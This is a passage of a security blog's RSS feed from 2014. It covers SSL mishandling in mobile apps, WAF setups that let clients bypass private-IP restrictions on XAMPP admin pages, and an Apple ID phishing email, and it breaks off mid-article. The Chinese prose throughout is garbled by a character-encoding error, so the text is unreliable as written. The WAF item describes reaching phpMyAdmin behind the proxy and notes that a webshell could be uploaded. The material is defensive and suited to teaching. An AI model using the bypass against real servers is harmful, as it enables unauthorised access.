&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;å°-webview-çš„ä¸€äº›è£œå……&quot;&gt;å° WebView çš„ä¸€äº›è£œå……&lt;/h4&gt;
&lt;p&gt;åœ¨å° WebView åšè™•ç†ä¸Šï¼Œé™¤äº†å° SSL éŒ¯èª¤ç›´æ¥ç•¥éå¤–ï¼Œç›®å‰ç„¡è«–æ˜¯åœ¨ Android é‚„æ˜¯ iOS ä¸Šï¼ŒSDK API éƒ½å°šæœªç›´æ¥æä¾›æ–¹æ³•è®“é–‹ç™¼è€…èƒ½åœ¨ SSL Handshake çš„é€”ä¸­ä½œ Server Certificate Pinningã€‚å…¶ä¸­ä¸€å€‹æ›¿ä»£æ–¹æ³•æ˜¯ï¼Œåˆ©ç”¨å…¶ä»–èƒ½å¤ ä½œ Pinning çš„å…ƒä»¶å°‡è³‡æ–™ä¸‹è¼‰å›ä¾†ï¼Œæ¥è‘—æŠŠè³‡æ–™å‚³åˆ° WebView é€²è¡Œè®€å–ï¼Œé¿é–‹åŸæœ¬ç”¨ WebView ç›´æ¥è¨­å®šé€£ç·šç¶²å€ã€‚è˜‹æœå…¬å¸æœ‰æä¾›é€™ç¨®è™•ç†çš„&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµèª&quot;&gt;çµèª&lt;/h3&gt;
&lt;p&gt;æœ¬ä¾†ç‚ºäº†æé«˜å®‰å…¨æ€§è€Œä½¿ç”¨çš„ SSL åŠ å¯†é€£ç·šï¼Œå»ç”±æ–¼ç¨‹å¼è™•ç†ä¸ç•¶è®“åŸä¾†çš„ä¿è­·å½¢åŒè™›è¨­ã€‚è§€å¿µä¸è¶³èˆ‡ç‚ºç¯€çœæ™‚é–“è€Œæ²’åšå¥½è™•ç†ç›¸ä¿¡æ˜¯ä¸»è¦åŸå› ã€‚ç¶²è·¯ä¸Šå¤§é‡çš„æ–‡ç« åœ¨å¼•æŒ‡é–‹ç™¼è€…ç•¥ééŒ¯èª¤è­¦å‘Šçš„æ™‚å€™ï¼Œå»æ²’æœ‰æé†’ä»–å€‘é€™æ¨£åšå¸¶ä¾†çš„å½±éŸ¿ï¼Œä¹ŸåŠ©é•·äº†ä¸ç•¶è™•ç†çš„ç™¼ç”Ÿã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº† SSL è™•ç†å•é¡Œå¤–ï¼Œæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼é‚„æœ‰è¨±å¤šè¦æ³¨æ„çš„å®‰å…¨å•é¡Œï¼Œåƒæ˜¯ OWASP åˆ—å‡ºçš„ &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;ã€ç”±æ—¥æœ¬æ™ºæ…§å‹æ‰‹æ©Ÿå®‰å…¨å”æœƒç™¼ä½ˆ &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; è£¡é¢æ‰€å»ºè­°çš„ã€‚é–‹ç™¼å•†æœ‰è²¬ä»»åšå¥½å®‰å…¨æŠŠé—œä»¥ä¿éšœé›™æ–¹æ¬Šç›Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog â€” SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;Google åŸºæ–¼æ•ˆèƒ½åŠæœ‰æ•ˆæ€§çš„è€ƒé‡ï¼Œåœ¨ Android ç³»çµ±ä¸Šé è¨­åœç”¨&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;æ†‘è­‰æ’¤éŠ·æª¢æŸ¥&lt;/a&gt;&lt;br /&gt;Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;OWASP çš„ Android ç¯„ä¾‹ä¸­ï¼Œå…§å«çš„ PUB_KEY æ˜¯éŒ¯èª¤çš„ (æœ€å¾Œæ›´æ”¹æ—¥æœŸ 2014/08/14)Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/</link>
                <guid>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</guid>
                <pubDate>Fri, 15 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è¨­å‚™ä¸è‰¯è¨­å®šå¸¶ä¾†çš„å®‰å…¨é¢¨éšªï¼šä»¥ WAF ç‚ºä¾‹</title>
                <description>&lt;p&gt;éå»è«‡åˆ°ç¶²ç«™å®‰å…¨ï¼Œé€šå¸¸æœƒä½¿ç”¨é˜²ç«ç‰†æˆ– IDS é€²è¡Œé˜²è­·ã€‚ä½†è¿‘å¹´ä¾†ç¶²ç«™å®‰å…¨è­°é¡Œéƒ½æ˜¯ä»¥ç¶²é æ‡‰ç”¨ç¨‹å¼çš„æ¼æ´å±…å¤šï¼Œç„¡æ³•å–®é é˜²ç«ç‰†é˜»æ“‹ã€‚ä»¥ OWASP Top 10 2013 çš„ç¬¬ä¸€å Injection è€Œè¨€ï¼Œå¤šåŠæ˜¯ç¨‹å¼æ’°å¯«æ–¹æ³•ä¸åš´è¬¹æ‰€é€ æˆï¼Œå› æ­¤æ‰æœ‰äº†ç¶²é æ‡‰ç”¨ç¨‹å¼é˜²ç«ç‰† (Web Application Firewall, WAF) çš„å‡ºç¾ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰äº† WAF å°±æ˜¯è¬éˆä¸¹äº†å—ï¼Ÿå°±ç®—æœ‰å„ç¨®è³‡å®‰è¨­å‚™ï¼Œä½†ç¼ºä¹å®‰å…¨çš„è¨­å®šï¼Œæœ‰çš„æ™‚å€™åè€Œæœƒè®“ç³»çµ±é™·å…¥å®‰å…¨é¢¨éšªä¸­ã€‚æˆ‘å€‘å°±ä»¥ Reverse Proxy æˆ– WAF è¨­å‚™ä¾†æ¢è¨ä¸ä½³è¨­å®šå¸¶ä¾†çš„å®‰å…¨é¢¨éšªã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-æ­é…ä¸ä½³çš„è¨­å®šæœƒå¸¶ä¾†ä»€éº¼å±å®³&quot;&gt;WAF æ­é…ä¸ä½³çš„è¨­å®šæœƒå¸¶ä¾†ä»€éº¼å±å®³ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ä»¥å¸¸è¦‹çš„ mod_proxy æ­é… mod_security çš„æ–¹æ¡ˆä¾†çœ‹ï¼Œé€šå¸¸ä½¿ç”¨ Reverse Proxy æˆ– Transparent Proxy ç‚ºå…¶æ¶æ§‹ï¼Œé€é Proxy çš„æ–¹å¼åœ¨ Client èˆ‡ Web Server ä¹‹é–“ï¼Œå° HTTP Request / Response é€²è¡Œéæ¿¾ï¼›ä»¥ HTTP Request ç‚ºä¾‹ï¼Œç•¶ WAF åµæ¸¬åˆ° Client ç«¯çš„è«‹æ±‚ä¸­æœ‰ SQL Injection èªæ³•æ™‚å€™ï¼Œå°‡æœƒé˜»æ–·é€™å€‹é€£ç·šé˜²æ­¢é§­å®¢æ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;åœ¨é€™ç¨®æ¶æ§‹ä¸‹çš„ WAF çœ‹ä¼¼å°å¾Œç«¯çš„ä¼ºæœå™¨å¤šäº†ä¸€ä»½ä¿éšœï¼Œä½†ä¹Ÿä¸¦éå®Œç¾ã€‚å…¶å•é¡Œæ˜¯å¾Œç«¯çš„ Web Server åœ¨é€é WAF å­˜å–çš„æƒ…æ³ä¸‹ï¼Œç„¡æ³•å¾—çŸ¥ä¾†è‡ª Client ç«¯çš„ä¾†æº IPï¼Œç›¸åçš„ Web Server èƒ½çœ‹åˆ°çš„ IP éƒ½å°‡æ˜¯ WAF çš„ IP (REMOTE ADDR)ï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹å¯èƒ½é€ æˆ Client ç«¯å¯ä»¥å­˜å–å— IP ä¾†æºé™åˆ¶çš„ç³»çµ±ã€‚å»¶ä¼¸é–±è®€ï¼š&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;å¦‚ä½•æ­£ç¢ºçš„å–å¾—ä½¿ç”¨è€… IPï¼Ÿ&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ä¸‹åœ–ç‚ºä¾‹ï¼Œç¶²ç«™æœ¬èº«åªå…è¨± 192.168.x.x çš„ç¶²æ®µé€£ç·šï¼Œå¦‚æœä»Šå¤© Client IP æ˜¯ 1.1.1.1ï¼Œå°‡ç„¡æ³•å­˜å–è©²ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;é™åˆ¶ IP å­˜å–&quot; title=&quot;é™åˆ¶ IP å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æœ‰å»ºç½® WAF çš„æ¶æ§‹ä¹‹ä¸‹ï¼ŒClient é€é WAF å­˜å–ç¶²ç«™ï¼Œç¶²ç«™å¾—åˆ°çš„ IP æœƒæ˜¯ WAF çš„ IPï¼š192.168.1.10ï¼Œå› æ­¤å…è¨±é€£ç·šï¼ŒClient å› è€Œå–å¾—åŸæœ¬éœ€åœ¨å…§ç¶²æ‰èƒ½å­˜å–çš„è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;å› ç‚º WAF è€Œç¹é IP é™åˆ¶&quot; title=&quot;å› ç‚º WAF è€Œç¹é IP é™åˆ¶&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¯¦éš›æ¡ˆä¾‹&quot;&gt;å¯¦éš›æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘ä»¥å¸¸è¦‹çš„ Web Server æ•´åˆåŒ… XAMPP ç‚ºä¾‹ï¼Œåœ¨é è¨­çš„ http-xampp.conf è¨­å®šæª”ä¸­é™åˆ¶äº†ä¸€äº›ç®¡ç†é é¢åªèƒ½ç”± Private IP å­˜å–ï¼Œå¦‚ /security ã€ /webalizer ã€ /phpmyadmin ã€ /server-status ã€ /server-info ç­‰ï¼Œæ­¤æ™‚ WAF çš„ IP è‹¥ç‚º Private IPï¼Œä¾ XAMPP é è¨­è¨­å®šï¼ŒWAF å°‡å¯ä»¥å­˜å–é€™äº›å— IP é™åˆ¶çš„è³‡æºï¼Œç•¶ WAF å­˜å–å®Œè³‡æºå¾Œåˆå°‡å…§å®¹å›å‚³çµ¦ Client ç«¯ã€‚&lt;/p&gt;

&lt;p&gt;http-xampp.conf é è¨­è¨­å®š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;LocationMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nb&quot;&gt;Deny&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from ::1 &lt;span class=&quot;m&quot;&gt;127.0.0.0/8&lt;/span&gt; \
                &lt;span class=&quot;err&quot;&gt;fc00::/7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/8&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;172&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;16&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/12&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;192&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;168&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;
                &lt;span class=&quot;err&quot;&gt;fe80::/10&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;169&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;254&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt;
         &lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;403&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/error/XAMPP_FORBIDDEN.html.var&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LocationMatch&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœç…§è‘—é è¨­çš„è¨­å®šï¼Œä»¥ç¾æˆçš„æ¡ˆä¾‹ä¾†çœ‹ï¼Œèƒ½å¤ å­˜å– Apache Server çš„ç³»çµ±ç‹€æ…‹ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°ç¶²ç«™æ‰€æœ‰é€£ç·šä»¥åŠ URI ç­‰è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;é è¨­é–‹æ”¾ Apache ä¼ºæœå™¨ç‹€æ…‹&quot; title=&quot;é è¨­é–‹æ”¾ Apache ä¼ºæœå™¨ç‹€æ…‹&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸¦ä¸”å¯ä»¥ç›´æ¥è®€å– phpMyAdmin ä»‹é¢ï¼Œä¸¦ä¸”è‡³è³‡æ–™åº«ä¸­æ–°å¢ã€ä¿®æ”¹ã€åˆªé™¤è³‡æ–™ï¼Œç”šè‡³ç›´æ¥ä¸Šå‚³ webshell é€²å…¥ä¸»æ©Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;ç›´æ¥é€²å…¥ phpMyAdmin ç®¡ç†ä»‹é¢&quot; title=&quot;ç›´æ¥é€²å…¥ phpMyAdmin ç®¡ç†ä»‹é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP ä¹Ÿå…§å»ºäº†ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizerï¼Œé€éé€™å€‹ä»‹é¢å¯ä»¥çŸ¥é“ç¶²ç«™æ‰€æœ‰é€²å…¥é»çš„æµé‡ã€çµ±è¨ˆæ•¸æ“šç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizer&quot; title=&quot;ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;å¦‚æœå»ºç½®äº† WAFï¼Œæœ‰é—œ IP çš„è¨­å®šå¿…é ˆè¦å¾ WAF æ”¯æ´çš„ HTTP Header ä¸­å–å‡ºä½¿ç”¨è€…çš„ IP (REMOTE_ADDR)ï¼Œæ‰èƒ½è®“åŸæœ¬ç¶²ç«™çš„ IP é™åˆ¶ç”Ÿæ•ˆã€‚åœ¨é€™ç¨®è¨­å®šéŒ¯èª¤æˆ–æ˜¯å° WAF æ¶æ§‹ä¸ç­è§£çš„æƒ…æ³ä¸‹ï¼ŒWAF åè€Œæˆç‚ºé§­å®¢ç¹é Private IP é™åˆ¶çš„è·³æ¿ï¼Œå°±å¦‚åŒç‚ºé§­å®¢é–‹äº†ä¸€å€‹å¾Œé–€ã€‚å› æ­¤åœ¨ä½¿ç”¨è³‡å®‰è¨­å‚™æ™‚ï¼Œå¿…é ˆç­è§£å…¶æ¶æ§‹ã€‚åˆ¥è®“è³‡å®‰è¨­å‚™ã€å®‰å…¨æ©Ÿåˆ¶ï¼Œåè€Œä½¿å¾—ä¼ºæœå™¨æ›´ä¸å®‰å…¨ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/18/waf-configuration-security-issue/</link>
                <guid>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</guid>
                <pubDate>Fri, 18 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Apple ID é‡£é­šéƒµä»¶æ¡ˆä¾‹</title>
                <description>&lt;p&gt;ä»Šå¤©åˆæœ‰ä¸æ€•æ­»çš„äººå¯„ä¾†é‡£é­šä¿¡äº†ï¼Œé€™æ¬¡æ˜¯é¨™å– Apple IDã€‚è®“æˆ‘å€‘ä¾†çœ‹çœ‹é€™å°ä¿¡ï¼Œå…¶ä¸­å…§å®¹æœ‰éå¸¸å¤šç ´ç¶»ï¼Œä¹Ÿå·²ç¶“è¢« Gmail ç›´æ¥å®šç‚º Spam äº†ï¼Œéå¸¸å¯æ†ã€‚é™¤äº†ä¿¡ä»¶ä¹‹å¤–ï¼Œé‡£é­šçš„ç¶²é æœ¬èº«ä¹Ÿå¾ˆå€¼å¾—æˆ‘å€‘å€Ÿé¡ï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹é€™æ¬¡çš„é‡£é­šéƒµä»¶æ¡ˆä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID é‡£é­šä¿¡&quot; title=&quot;Apple ID é‡£é­šä¿¡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢&quot;&gt;å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å…ˆä¾†è«‡è«‡è¦å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢ã€‚æˆ‘å€‘å¯ä»¥å¾å››å€‹è¦ç´ ä¾†çœ‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ¨™é¡Œ&lt;/li&gt;
  &lt;li&gt;å¯„ä»¶è€…&lt;/li&gt;
  &lt;li&gt;å…§æ–‡&lt;/li&gt;
  &lt;li&gt;é€£çµ&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;æ¨™é¡Œ&quot;&gt;æ¨™é¡Œ&lt;/h4&gt;

&lt;p&gt;é¦–å…ˆï¼Œé€™å°ä¿¡çš„æ¨™é¡Œéå¸¸å‡ï¼Œä¸€èˆ¬ä¾†èªªå…¬å¸ä¸æœƒä½¿ç”¨é€™é¡æ¨™é¡Œï¼Œé€™ç¨®åˆ¤æ–·æ¯”è¼ƒéœ€è¦ç¶“é©—ã€‚é‡£é­šä¿¡ä»¶æœƒä½¿ç”¨éå¸¸è³å‹•ã€å¸å¼•ä½ å»åšå‹•ä½œçš„æ¨™é¡Œã€‚ä¾‹å¦‚å¸¸è¦‹çš„ã€Œä½ çš„å¸³è™Ÿé­åˆ°åœç”¨ã€ã€ã€Œæ›´æ›å¸³è™Ÿè³‡è¨Šé€šçŸ¥ã€ç­‰ã€‚é»ä¸‹é€£çµå°±æœƒå¸¶ä½ å»å‡é€ çš„é é¢é¨™ä½ è¼¸å…¥å¯†ç¢¼ï¼Œåƒè¬åˆ¥å‚»å‚»ç•¶çœŸã€‚&lt;/p&gt;

&lt;h4 id=&quot;å¯„ä»¶è€…&quot;&gt;å¯„ä»¶è€…&lt;/h4&gt;

&lt;p&gt;å¯„ä»¶è€…é€šå¸¸æ˜¯é‡£é­šä¿¡ä¸€å®šæœƒåŠ å¼·å‡é€ çš„éƒ¨åˆ†ï¼Œåˆ©ç”¨å®˜æ–¹å­˜åœ¨çš„ä¿¡ç®±æˆ–æ˜¯ä»–äººçš„ä¿¡ç®±å¯„ä¿¡ï¼ŒåŠ å¼·ä½ çš„ä¿¡ä»»ã€‚ä¸ééœ€è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;å¯„ä»¶è€…çš„æ¬„ä½æ˜¯å¯ä»¥å‡é€ ã€éš¨æ„å¡«å¯«çš„ï¼Œåƒè¬ä¸è¦ç›´æ¥ä¿¡ä»»ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä»¥é€™å°ä¿¡ç‚ºä¾‹ï¼Œå¯„ä»¶è€…ã€Œservice@apple.comã€æ˜¯ä¸å­˜åœ¨çš„ã€‚ç•¶ç„¶é€™å€‹æ¬„ä½å¯ä»¥å‡é€ ï¼Œä½†é€£å‡é€ éƒ½éŒ¯ï¼Œå¯¦åœ¨æ˜¯éå¸¸ä¸ç”¨å¿ƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;å…§æ–‡&quot;&gt;å…§æ–‡&lt;/h4&gt;

&lt;p&gt;ä¿¡ä»¶çš„å…§æ–‡å°±æ˜¯ç²¾è¯äº†ï¼Œè¦æ€éº¼åšå‡ºä¸€å°å¾ˆåƒå®˜æ–¹çš„ä¿¡ä»¶ï¼Œåˆè¦èª˜ä½¿äººå»é»é¸ï¼Œå¯¦åœ¨æ˜¯ä¸€é–€è—è¡“ã€‚ç²¾å¿ƒè¨­è¨ˆçš„é‡£é­šä¿¡ã€ç¤¾äº¤å·¥ç¨‹ã€APT éƒµä»¶ï¼Œé€šå¸¸éƒ½æœƒé‡å°å—å®³è€…å®¢è£½åŒ–ï¼Œèª¿æŸ¥èº«é‚Šçš„ç¤¾äº¤åœˆã€å¸¸è«‡çš„è©±é¡Œã€å¸¸ç”¨çš„æœå‹™ã€æœƒé»æ“Šçš„éƒµä»¶ï¼Œä¾†è£½é€ ä¸€å€‹ä¸€å®šæœƒä¸­ççš„ä¿¡ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶å¾ˆå¤šæ™‚å€™æ”»æ“Šè€…èª¿æŸ¥ä¸è¶³ï¼Œé‚„æ˜¯æœƒå‡ºç¾è››çµ²é¦¬è·¡çš„ã€‚ä¾‹å¦‚ä¾†è‡ªä¸­åœ‹çš„æƒ¡æ„éƒµä»¶ï¼Œå¸¸æœƒå‡ºç¾ã€Œ&lt;strong&gt;å°Šæ•¬çš„ç”¨æˆ¶æ‚¨å¥½&lt;/strong&gt;ã€é€™ç¨®åœ¨å°ç£äººçœ¼ä¸­çœ‹äº†å¾ˆå½†æ‰­çš„è©å½™ã€‚å¦‚æœå‡ºç¾äº†ä¸å¸¸è¦‹çš„ç”¨è©ï¼Œå°±éå¸¸æœ‰å¯èƒ½æ˜¯ä¸€å€‹å‡é€ çš„æƒ¡æ„éƒµä»¶ï¼Œåƒè¬ä¸è¦å‚»å‚»çš„é»é¸é€£çµæˆ–é™„ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;å†å›é ­ä¾†ä»¥é€™å°ä¿¡ç‚ºä¾‹ï¼Œæœ€å¤§çš„ç ´ç¶»é™¤äº†éåˆ¶å¼çš„å…§æ–‡ä¹‹å¤–ï¼Œå°±å±¬ç½²åäº†ã€‚æ˜æ˜æ˜¯å‡é€ ã€ŒApple Customer Supportã€çš„ä¾†ä¿¡ï¼Œæœ€ä¸‹é¢å»ç°½ç½²ã€ŒMicrosoft Privacy and cookies Developersã€ï¼Œæœ‰æ²’æœ‰æéŒ¯ï¼Ÿå¯ä»¥å†ç”¨é»å¿ƒå—ï¼Ÿ&lt;/p&gt;

&lt;h4 id=&quot;é€£çµ&quot;&gt;é€£çµ&lt;/h4&gt;

